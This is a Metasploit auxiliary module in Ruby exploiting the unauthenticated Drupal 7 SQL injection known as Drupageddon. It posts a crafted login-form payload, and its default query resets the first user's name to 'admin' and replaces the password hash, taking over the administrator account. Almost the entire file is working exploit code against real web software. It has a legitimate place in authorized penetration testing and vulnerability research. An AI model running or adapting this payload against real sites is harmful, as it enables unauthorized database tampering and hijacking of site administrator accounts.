##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal SQL Injection (Drupageddon)',
      'Description'    => %q{
        This module exploits an unauthenticated SQL injection vulnerability affecting Drupal
        (>= 7.0 <= 7.31) discovered by Stefan Horst of SektionEins GmbH. The SQL injection issue
        can be abused in order to execute arbitrary SQL queries on the database server connected
        to the Drupal instance.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Stefan Horst', # Discovery of vulnerability
          'fyukyuk', # Public POC
          'Sven Vetsch' # Metasploit Module
        ],
      'References'     =>
        [
          ['URL', 'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html'], # Advisory by SektionEins GmbH
          ['URL', 'https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'], # Blog entry about the vulnerability by SektionEins GmbH
          ['URL', 'https://www.drupal.org/SA-CORE-2014-005'], # Advisory by Drupal Security Team
          ['URL', 'https://www.reddit.com/r/netsec/comments/2jbu8g/sacore2014005_drupal_core_sql_injection/clagqhd'] # Public POC
        ],
       'DisclosureDate' => 'Sep 16 2014'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The URI of the Drupal installation', '/']),
        OptString.new('QUERY', [true, 'SQL query to execute', 'UPDATE users SET name=\'admin\',pass=\'$S$DqMpvWGR.x3DDkc0aeAZ2wFmfm6Ra/rbZQDBEOyyaTEDtUTeb8g1\' WHERE uid=\'1\';'])
      ], self.class)
  end

  def run
    begin
      print_status("Launching exploit.")
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri(target_uri.path.to_s),
        'data'   => "name[0%20;"+Rex::Text.uri_encode(datastore['QUERY']).gsub!("%20","+")+";#%20%20]=x&name[0]=x&pass=x&test2=x&form_build_id=&form_id=user_login_block&op=Log+in"
      }, 10)

      if res && res.code == 200 then
        print_good("Injection sent to server. Verification needs to be done manually as no response is to be expected by the server")
      else
        fail_with(Failure::Unknown, "Failed to exploit the SQLi...")
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Failed to connect")
      return
    end
  end
end
